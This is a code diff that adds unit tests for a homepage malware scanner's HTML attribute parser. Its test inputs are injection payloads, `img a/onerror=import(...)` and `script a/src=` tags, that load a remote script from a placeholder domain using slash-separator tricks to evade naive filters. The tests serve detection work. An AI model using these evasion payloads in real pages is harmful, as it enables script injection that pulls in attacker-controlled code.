@@ -40,6 +40,7 @@ import {
   MAX_HOMEPAGE_MALICIOUS_FINDINGS,
   themeMaliciousDomains,
 } from "../../app/services/runtime-malicious.server";
+import { parseOpenTagAttributes } from "../../app/services/scan-engine.server";
 import { buildSecurityRisks } from "../../app/services/security-risk.server";
 
 const page = (head: string, body = "") =>
@@ -454,6 +455,30 @@ describe("findMaliciousInHomepage: on*= event handlers (gc-7gjj.4)", () => {
     expect(findMaliciousInHomepage(html, []).map((h) => [h.domain, h.source])).toEqual([
       ["biliing.top", "script"],
     ]);
+  });
+
+  it("a `/` ends an attribute name, so `a/onerror=` and `a/src=` are read (wave 3 D1)", () => {
+    const D = "cb28utrk.com";
+    const hits = (body: string) =>
+      findMaliciousInHomepage(page("", body), []).map((h) => [h.domain, h.source]);
+    expect(hits(`<img a/onerror="import('https://${D}/a.js')">`)).toEqual([[D, "event_handler"]]);
+    expect(hits(`<script a/src=https://${D}/a.js></script>`)).toEqual([[D, "script"]]);
+    expect(hits(`<img src="x"/onerror="import('https://${D}/a.js')">`)).toEqual([
+      [D, "event_handler"],
+    ]);
+    // An unquoted VALUE keeps its `/`: `src=x/onerror=...` is one src value.
+    expect(hits(`<img src=x/onerror="import('https://${D}/a.js')">`)).toEqual([]);
+  });
+
+  it("parseOpenTagAttributes splits names at `/` but never an unquoted value", () => {
+    const tag = `<script a/src=https://x.example/y/z.js data/x=1>`;
+    const seen: string[] = [];
+    const out = parseOpenTagAttributes(tag, 0, "<script".length, ["src"], (n, v) =>
+      seen.push(`${n}=${v}`),
+    );
+    expect(out?.attributes.src?.value).toBe("https://x.example/y/z.js");
+    expect(seen).toEqual(["src=https://x.example/y/z.js", "x=1"]);
+    expect(out?.end).toBe(tag.length);
   });
 
   it("an element named like an Object.prototype member is an ordinary element (audit fix)", () => {
